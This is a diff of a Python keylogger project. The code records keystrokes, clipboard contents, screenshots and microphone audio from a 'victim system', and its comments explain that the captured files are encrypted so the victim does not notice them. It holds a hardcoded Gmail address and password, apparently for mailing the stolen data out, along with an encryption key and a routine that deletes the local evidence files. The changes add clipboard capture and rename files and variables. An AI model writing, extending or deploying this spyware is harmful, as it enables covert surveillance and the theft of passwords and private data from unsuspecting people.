@@ -37,15 +37,15 @@ from PIL import ImageGrab  # screenshot library
 
 keys_information = "key_log.txt"
 system_information = "system_info.txt"
-clipboard_information = "clipboard_info.txt"
+clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 
 # Encryption Variables (we encrypt the files because when these files are on the victim system , they dont find about it)
 
 keys_information_e = "e_key_log.txt"
-system_information_e = "e_system_info.txt"
-clipboard_information_e = "e_clipboard_info.txt"
+system_information_e = "e_systeminfo.txt"
+clipboard_information_e = "e_clipboard.txt"
 
 microphone_time = 10  # time in seconds
 time_iteration = 15
@@ -56,7 +56,7 @@ password = "fyylgrzcjqftecbt"
 username = getpass.getuser()
 
 toaddr = "trashkeylogger@gmail.com"
-key = "Kvmz5UCdx9ctZ3Sd9NZNybmC_hbKfagfVRW6dknZ4ro="  # key for encryption
+key = "Svok2Q3NSJTU9o0qcESR4tlYK2jblqGTI_WbCLD92m8="  # key for encryption
 
 file_path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
 extend = "\\"  # it will add a extra slash in the path so that we can access the key_log.txt file
@@ -131,6 +131,10 @@ def copy_clipboard():
             win32clipboard.OpenClipboard()  # open the clipboard
             pasted_data = win32clipboard.GetClipboardData()  # get the clipboard data
             win32clipboard.CloseClipboard()  # close the clipboard
+
+            # write the clipboard data
+            f.write("Clipboard Data: \n" + pasted_data)
+
         except:
             f.write("Clipboard could not be copied")
 
@@ -179,6 +183,8 @@ while number_of_iterations < number_of_iterations_end:
 
     def on_press(key):
         global keys, count, currentTime
+
+        print(key)
         keys.append(key)
         count += 1
         currentTime = time.time()
@@ -193,10 +199,17 @@ while number_of_iterations < number_of_iterations_end:
             for key in keys:
                 # replace the single quotes with nothing
                 k = str(key).replace("'", "")
-                if "space" in k:  # if space is pressed then add a space
+                # if "space" in k:  # if space is pressed then add a space
+                #     f.write('\n')
+                # elif "Key" not in k:
+                #     f.write(k)
+
+                if k.find("space") > 0:
                     f.write('\n')
-                elif "Key" not in k:
+                    f.close()
+                elif k.find("Key") == -1:
                     f.write(k)
+                    f.close()
 
     def on_release(key):
         if key == Key.esc:  # if escape key is pressed then stop the keylogger
@@ -229,7 +242,7 @@ encrypted_file_names = [file_merge + system_information_e,
 
 count = 0
 
-for encrypting_files in files_to_encrypt:
+for encrypting_file in files_to_encrypt:
     with open(files_to_encrypt[count], 'rb') as f:
         data = f.read()
 
@@ -249,5 +262,5 @@ time.sleep(120)  # sleep for 2 minutes
 
 delete_files = [system_information, clipboard_information,
                 keys_information, screenshot_information, audio_information]
-for files in delete_files:
-    os.remove(file_path + files)
+for file in delete_files:
+    os.remove(file_path + file)
